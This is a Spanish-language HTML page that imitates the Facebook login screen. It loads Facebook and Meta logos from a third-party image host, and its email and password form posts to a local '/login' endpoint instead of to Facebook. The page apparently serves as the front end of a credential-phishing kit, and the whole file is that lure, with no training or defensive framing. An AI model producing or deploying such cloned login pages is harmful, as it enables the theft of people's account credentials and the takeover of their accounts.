<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Iniciar sesión</title>
    <style>
        /* Reset y ajustes generales */
        body, html {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom, #f0f2f5, #e7ebf0);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Contenedor principal */
        .container {
            text-align: center;
            width: 100%;
            max-width: 400px;
        }

        /* Sección de idioma */
        .language {
            font-size: 14px;
            color: #1c1e21;
            margin-bottom: 20px;
        }

        /* Logo de Facebook */
        .logo img {
            width: 75px;
            margin-bottom: 20px;
        }

        /* Caja de inicio de sesión */
        .login-box {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .login-box input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }

        .login-box button {
            width: 100%;
            padding: 15px;
            margin: 15px 0;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            color: #fff;
            background-color: #1877f2;
            cursor: pointer;
        }

        .login-box button:hover {
            background-color: #166fe5;
        }

        .forgot-password {
            display: block;
            margin-top: 10px;
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        /* Botón de crear cuenta */
        .create-account button {
            background-color: #fff;
            border: 1px solid #1877f2;
            color: #1877f2;
            font-size: 16px;
            font-weight: bold;
            padding: 12px 20px;
            border-radius: 8px;
            margin-top: 20px;
            cursor: pointer;
        }

        .create-account button:hover {
            background-color: #e7f3ff;
        }

        /* Logo de Meta */
        .meta-logo {
            margin-top: 40px;
            color: #606770;
            font-size: 14px;
        }  
    </style>
</head>
<body>
    <div class="container">
        <div class="language">
            Español
        </div>
        <div class="logo">
            <img src="https://i.postimg.cc/3R9h4tj7/5-D8s-Gs-HJl-J.png" alt="Facebook Logo">
        </div>
        <div class="login-box">
            <form action="/login" method="POST">
                <input type="text" name="correo" placeholder="Celular o correo electrónico" required>
                <input type="password" name="contraseña" placeholder="Contraseña" required>
                <button type="submit">Iniciar sesión</button>
                <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
            </form>
        </div>
        <div class="create-account">
            <button>Crear cuenta nueva</button>
        </div>
        <div class="meta-logo">
            <img src="https://i.postimg.cc/636JXCkP/DDgw-Tv3-Jeh-F.png" alt="Meta Logo" width="100">
        </div>
    </div>
</body>
</html>
